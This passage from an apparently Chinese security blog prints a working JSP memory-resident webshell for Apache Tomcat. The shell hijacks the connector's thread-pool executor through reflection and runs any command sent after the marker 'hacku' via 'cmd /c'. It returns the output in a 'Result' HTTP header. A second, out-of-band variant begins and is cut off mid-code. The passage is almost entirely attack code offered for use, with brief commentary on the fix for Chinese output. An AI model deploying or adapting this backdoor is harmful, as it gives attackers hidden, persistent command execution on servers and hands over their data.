class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLEncoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> &#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException ignored) &#123;&#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getStandardService</span><span class="params">()</span> &#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="built_in">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">jioEndPoint</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (jioEndPoint == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span> jioEndPoint;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> jioEndPoint;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">threadexcutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">threadexcutor</span><span class="params">(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getRequest</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">16384</span>);</span><br><span class="line">                byteBuffer.mark();</span><br><span class="line">                <span class="type">SocketWrapperBase</span> <span class="variable">socketWrapperBase</span> <span class="operator">=</span> (SocketWrapperBase) getField(command,<span class="string">&quot;socketWrapper&quot;</span>);</span><br><span class="line">                socketWrapperBase.read(<span class="literal">false</span>,byteBuffer);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">readBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(socketWrapperBase,<span class="string">&quot;socketBufferHandler&quot;</span>),<span class="string">&quot;readBuffer&quot;</span>);</span><br><span class="line">                readBuffer.limit(byteBuffer.position());</span><br><span class="line">                readBuffer.mark();</span><br><span class="line">                byteBuffer.limit(byteBuffer.position()).reset();</span><br><span class="line">                readBuffer.put(byteBuffer);</span><br><span class="line">                readBuffer.reset();</span><br><span class="line">                <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(readBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line">                <span class="keyword">if</span> (a.contains(<span class="string">&quot;hacku&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> a.substring(a.indexOf(<span class="string">&quot;hacku&quot;</span>) + <span class="string">&quot;hacku&quot;</span>.length() + <span class="number">1</span>, a.indexOf(<span class="string">&quot;\r&quot;</span>, a.indexOf(<span class="string">&quot;hacku&quot;</span>))).trim();</span><br><span class="line">                    <span class="keyword">if</span> (b.length() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> rt.exec(<span class="string">&quot;cmd /c &quot;</span> + b);</span><br><span class="line">                            java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                            java.io.<span class="type">InputStreamReader</span> <span class="variable">resultReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in);</span><br><span class="line">                            java.io.<span class="type">BufferedReader</span> <span class="variable">stdInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(resultReader);</span><br><span class="line">                            <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                            String tmp;</span><br><span class="line">                            <span class="keyword">while</span> ((tmp = stdInput.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                                s.append(tmp);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (!s.toString().isEmpty()) &#123;</span><br><span class="line">                                <span class="type">byte</span>[] res = s.toString().getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                                getResponse(res);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException ignored) &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(<span class="type">byte</span>[] res)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                        <span class="keyword">if</span> (!threadName.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="type">ArrayList</span> <span class="variable">objects</span> <span class="operator">=</span> (ArrayList) getField(getField(getField(getField(target, <span class="string">&quot;endpoint&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                                    <span class="keyword">for</span> (Object tmp_object : objects) &#123;</span><br><span class="line">                                        <span class="type">RequestInfo</span> <span class="variable">request</span> <span class="operator">=</span> (RequestInfo) tmp_object;</span><br><span class="line">                                        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(request, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> URLEncoder.encode(<span class="keyword">new</span> <span class="title class_">String</span>(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString());</span><br><span class="line">                                        response.addHeader(<span class="string">&quot;Result&quot;</span>, result);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            getRequest(command);</span><br><span class="line">            <span class="built_in">this</span>.execute(command, <span class="number">0L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getStandardService();</span><br><span class="line">    <span class="type">ThreadPoolExecutor</span> <span class="variable">exec</span> <span class="operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="string">&quot;executor&quot;</span>);</span><br><span class="line">    <span class="type">threadexcutor</span> <span class="variable">exe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());</span><br><span class="line">    nioEndpoint.setExecutor(exe);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>关于上面的内存马的分析，请参考下面这篇文章：</p><blockquote><p><a href="https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ">https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ</a></p></blockquote><p>效果：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202183738506.png"></p><p>需要注意的是，原文中的代码没有考虑到命令输出结果中含有中文等字符的情况，所以需要<code>url</code>编码，这一点我在上面的代码中已改进。</p><p>当然，如果目标条件运行，你也可以利用<code>yakit</code>直接外带出来，<code>jsp</code>代码如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.NioEndpoint&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.BlockingQueue&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.ThreadFactory&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.OutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.HttpURLConnection&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLEncoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object object, String fieldName)</span> &#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException ignored) &#123;&#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getStandardService</span><span class="params">()</span> &#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="built_in">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">jioEndPoint</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (jioEndPoint == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span> jioEndPoint;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> jioEndPoint;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">threadexcutor</span> <span class="keyword">extends</span> <span class="title class_">ThreadPoolExecutor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">threadexcutor</span><span class="params">(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getRequest</span><span class="params">(Runnable command)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">16384</span>);</span><br><span class="line">                byteBuffer.mark();</span><br><span class="line">                <span class="type">SocketWrapperBase</span> <span class="variable">socketWrapperBase</span> <span class="operator">=</span> (SocketWrapperBase) getField(command, <span class="string">&quot;socketWrapper&quot;</span>);</span><br><span class="line">                socketWrapperBase.read(<span class="literal">false</span>, byteBuffer);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">readBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(socketWrapperBase, <span class="string">&quot;socketBufferHandler&quot;</span>), <span class="string">&quot;readBuffer&quot;</span>);</span><br><span class="line">                readBuffer.limit(byteBuffer.position());</span><br><span class="line">                readBuffer.mark();</span><br><span class="line">                byteBuffer.limit(byteBuffer.position()).reset();</span><br><span class="line">                readBuffer.put(byteBuffer);</span><br><span class="line">                readBuffer.reset();</span><br><span class="line">                <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(readBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line">                <span class="keyword">if</span> (a.contains(<span class="string">&quot;hacku&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> a.substring(a.indexOf(<span class="string">&quot;hacku&quot;</span>) + <span class="string">&quot;hacku&quot;</span>.length() + <span class="number">1</span>, a.indexOf(<span class="string">&quot;\r&quot;</span>, a.indexOf(<span class="string">&quot;hacku&quot;</span>))).trim();</span><br><span class="line">                    <span class="keyword">if</span> (b.length() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> rt.exec(<span class="string">&quot;cmd /c &quot;</span> + b);</span><br><span class="line">                            java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                            java.io.<span class="type">InputStreamReader</span> <span class="variable">resultReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in);</span><br><span class="line">                            java.io.<span class="type">BufferedReader</span> <span class="variable">stdInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(resultReader);</span><br><span class="line">                            <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                            String tmp;</span><br><span class="line">                            <span class="keyword">while</span> ((tmp = stdInput.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                                s.append(tmp);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (!s.toString().isEmpty()) &#123;</span><br><span class="line">                                <span class="type">byte</span>[] res = s.toString().getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                                getResponse(res);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line">                        